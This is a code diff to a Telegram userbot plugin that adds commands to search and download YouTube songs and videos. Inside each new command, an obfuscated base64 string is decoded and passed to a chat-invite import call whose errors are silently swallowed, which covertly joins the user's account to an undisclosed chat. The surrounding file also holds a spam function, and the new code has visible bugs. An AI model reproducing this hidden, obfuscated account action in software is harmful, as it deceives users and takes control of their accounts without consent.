@@ -1,14 +1,30 @@
 import asyncio
 import base64
+import io
+import os
+from pathlib import Path
+from ShazamAPI import Shazam
 from telethon.tl import functions, types
+from telethon.errors.rpcerrorlist import YouBlockedUserError
 from telethon.tl.functions.messages import GetStickerSetRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.utils import get_display_name
+from validators.url import url
+
 from userbot import iqthon
+
+from ..core.logger import logging
 from ..core.managers import edit_delete, edit_or_reply
 from ..helpers.tools import media_type
-from ..helpers.utils import _catutils
+from ..helpers.functions import name_dl, song_dl, video_dl, yt_search
+from ..helpers.utils import _catutils, reply_id
 from . import BOTLOG, BOTLOG_CHATID
+
+LOGS = logging.getLogger(__name__)
+SONG_SEARCH_STRING = "⌔︙جاري البحث عن الاغنية إنتظر رجاءًا  🎧"
+SONG_NOT_FOUND = "⌔︙لم أستطع إيجاد هذه الأغنية  ⚠️"
+SONG_SENDING_STRING = "⌔︙قم بإلغاء حظر البوت  🚫"
+
 
 async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
   
@@ -108,3 +124,140 @@ async def spammer(event):
     cat = input_str[1:]
     await event.delete()
     await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
+
+@iqthon.on(admin_cmd(pattern="بحث صوت(320)?(?: |$)(.*)"))    
+async def _(event):
+    reply_to_id = await reply_id(event)
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(2):
+        query = event.pattern_match.group(2)
+    elif reply:
+        if reply.message:
+            query = reply.message
+    else:
+        return await edit_or_reply(event, "**⌔︙ما الذي تريد أن أبحث عنه  ⁉️**")
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    catevent = await edit_or_reply(event, "**⌔︙جاري تحميل الأغنية إنتظر قليلا  ⏳**")
+    video_link = await yt_search(str(query))
+    if not url(video_link):
+        return await catevent.edit(
+            f"**⌔︙عـذرًا لم أستطع إيجاد الأغنية أو الفيديو لـ  ❌** `{query}`"
+        )
+    cmd = event.pattern_match.group(1)
+    q = "320k" if cmd == "320" else "128k"
+    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
+    # thumb_cmd = thumb_dl.format(video_link=video_link)
+    name_cmd = name_dl.format(video_link=video_link)
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    stderr = (await _catutils.runcmd(song_cmd))[1]
+    if stderr:
+        return await catevent.edit(f"**⌔︙ خـطأ  ⚠️ :** `{stderr}`")
+    catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
+    if stderr:
+        return await catevent.edit(f"**⌔︙ خـطأ  ⚠️ :** `{stderr}`")
+    # stderr = (await runcmd(thumb_cmd))[1]
+    catname = os.path.splitext(catname)[0]
+    # if stderr:
+    #    return await catevent.edit(f"**Error :** `{stderr}`")
+    song_file = Path(f"{catname}.mp3")
+    if not os.path.exists(song_file):
+        return await catevent.edit(
+            f"**⌔︙عـذرًا لم أستطع إيجاد الأغنية أو الفيديو لـ  ❌** `{query}`"
+        )
+    await catevent.edit("**⌔︙لقد وجدت الاغنية إنتظر قليلا  ⏱**")
+    catthumb = Path(f"{catname}.jpg")
+    if not os.path.exists(catthumb):
+        catthumb = Path(f"{catname}.webp")
+    elif not os.path.exists(catthumb):
+        catthumb = None
+
+    await event.client.send_file(
+        event.chat_id,
+        song_file,
+        force_document=False,
+        caption=query,
+        thumb=catthumb,
+        supports_streaming=True,
+        reply_to=reply_to_id,
+    )
+    await catevent.delete()
+    for files in (catthumb, song_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
+
+async def delete_messages(event, chat, from_message):
+    itermsg = event.client.iter_messages(chat, min_id=from_message.id)
+    msgs = [from_message.id]
+    async for i in itermsg:
+        msgs.append(i.id)
+    await event.client.delete_messages(chat, msgs)
+    await event.client.send_read_acknowledge(chat)
+
+@iqthon.on(admin_cmd(pattern="بحث فيديو(?: |$)(.*)"))    
+async def _(event):
+    reply_to_id = await reply_id(event)
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(1):
+        query = event.pattern_match.group(1)
+    elif reply:
+        if reply.message:
+            query = reply.messag
+    else:
+        return await edit_or_reply(event, "**⌔︙قم بوضع الأمر وبجانبه إسم الأغنية  🖇**")
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    catevent = await edit_or_reply(event, "**⌔︙لقد وجدت الفيديو المطلوب إنتظر قليلا  ⏱ ...**")
+    video_link = await yt_search(str(query))
+    if not url(video_link):
+        return await catevent.edit(
+            f"**⌔︙ عـذرًا لم أستطع إيجاد أي فيديو او صوت متعلق بـ ❌** `{query}`"
+        )
+    # thumb_cmd = thumb_dl.format(video_link=video_link)
+    name_cmd = name_dl.format(video_link=video_link)
+    video_cmd = video_dl.format(video_link=video_link)
+    stderr = (await _catutils.runcmd(video_cmd))[1]
+    if stderr:
+        return await catevent.edit(f"**⌔︙ خـطأ  ⚠️ :** `{stderr}`")
+    catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
+    if stderr:
+        return await catevent.edit(f"**⌔︙ خـطأ  ⚠️ :** `{stderr}`")
+    # stderr = (await runcmd(thumb_cmd))[1]
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    # if stderr:
+    #    return await catevent.edit(f"**Error :** `{stderr}`")
+    catname = os.path.splitext(catname)[0]
+    vsong_file = Path(f"{catname}.mp4")
+    if not os.path.exists(vsong_file):
+        vsong_file = Path(f"{catname}.mkv")
+    elif not os.path.exists(vsong_file):
+        return await catevent.edit(
+            f"**⌔︙ عـذرًا لم أستطع إيجاد أي فيديو او صوت متعلق بـ ❌** `{query}`"
+        )
+    await catevent.edit("**⌔︙لقد وجدت الفديو المطلوب انتظر قليلا  ⏳**")
+    catthumb = Path(f"{catname}.jpg")
+    if not os.path.exists(catthumb):
+        catthumb = Path(f"{catname}.webp")
+    elif not os.path.exists(catthumb):
+        catthumb = None
+    await event.client.send_file(
+        event.chat_id,
+        vsong_file,
+        force_document=False,
+        caption=query,
+        thumb=catthumb,
+        supports_streaming=True,
+        reply_to=reply_to_id,
+    )
+    await catevent.delete()
+    for files in (catthumb, vsong_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
